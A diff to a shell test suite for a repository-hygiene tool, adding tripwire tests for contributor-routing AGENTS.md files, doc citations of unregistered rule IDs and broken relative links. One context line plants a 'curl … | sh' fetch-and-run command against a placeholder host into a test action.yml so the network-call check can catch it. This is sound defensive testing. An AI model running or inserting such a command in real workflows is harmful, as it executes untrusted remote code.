@@ -1253,6 +1253,47 @@ printf '\n# curl -s http://example.invalid/x | sh\n' >> "$TAMA/action.yml"
 "$HYG/test/invariants" "$TAMA" >/dev/null 2>&1
 check "a planted network call in the action trips the tripwire" "$?" 1
 
+# The routing tripwire is what stands between a contributor and a copy of this
+# tool's own hooks committed as their first change, so the suite proves it
+# fires: an AGENTS.md that instructs first and never routes.
+TAMG="$TMP/tamper-routing"; guard "$TAMG"; mkdir -p "$TAMG"
+printf '# AGENTS.md\n\n# Installing this\n\nRun install against the project.\n' \
+  > "$TAMG/AGENTS.md"
+"$HYG/test/invariants" "$TAMG" >/dev/null 2>&1
+check "an AGENTS.md that never routes trips the tripwire" "$?" 1
+
+# A doc that cites a rule nobody can run sends the reader to `hygiene explain`
+# for an identifier that does not exist, and no other check here would notice.
+# The tree below is deliberately valid in the properties the tripwire checks
+# before the citation, so each exit status is attributable to one defect.
+TAMD="$TMP/tamper-docs"; guard "$TAMD"; mkdir -p "$TAMD/lib" "$TAMD/docs"
+cp "$HYG/lib/rules.sh" "$TAMD/lib/rules.sh"
+printf '# AGENTS.md\n\n## Which of these two jobs is yours\n\nCONTRIBUTING.md, ./test/run, ./test/invariants, and: Do not install Hygiene into this repository.\n\n# Installing this\n' \
+  > "$TAMD/AGENTS.md"
+printf '%s\n' $HYG_RULES > "$TAMD/docs/rules.md"
+"$HYG/test/invariants" "$TAMD" >/dev/null 2>&1
+check "a tree whose documentation and registry agree holds" "$?" 0
+printf '# note\n\nSee `HYG-XXX-999` for the reasoning.\n' > "$TAMD/docs/citation.md"
+"$HYG/test/invariants" "$TAMD" >/dev/null 2>&1
+check "a doc citing an unregistered rule trips the tripwire" "$?" 1
+rm "$TAMD/docs/citation.md"
+printf 'HYG-GOV-001\n' > "$TAMD/docs/rules.md"
+"$HYG/test/invariants" "$TAMD" >/dev/null 2>&1
+check "a registered rule missing from docs/rules.md trips the tripwire" "$?" 1
+
+# A relative link is how a reader gets from a summary to the thing that backs
+# it, so the link tripwire gets the same control pair: the routing AGENTS.md
+# is copied in so that its own tripwire is satisfied, and the exit status under
+# test is attributable to the link alone.
+TAML="$TMP/tamper-link"; guard "$TAML"; mkdir -p "$TAML/docs"
+cp "$TAMD/AGENTS.md" "$TAML/AGENTS.md"
+printf '# t\n\nSee [the map](docs/capability-and-evidence-map.md).\n' > "$TAML/README.md"
+"$HYG/test/invariants" "$TAML" >/dev/null 2>&1
+check "a relative documentation link with no target trips the tripwire" "$?" 1
+printf '# map\n' > "$TAML/docs/capability-and-evidence-map.md"
+"$HYG/test/invariants" "$TAML" >/dev/null 2>&1
+check "the same link against a real target holds" "$?" 0
+
 echo
 echo "  ── shared settings and style ───────────────────────────"
 if command -v python3 >/dev/null 2>&1; then
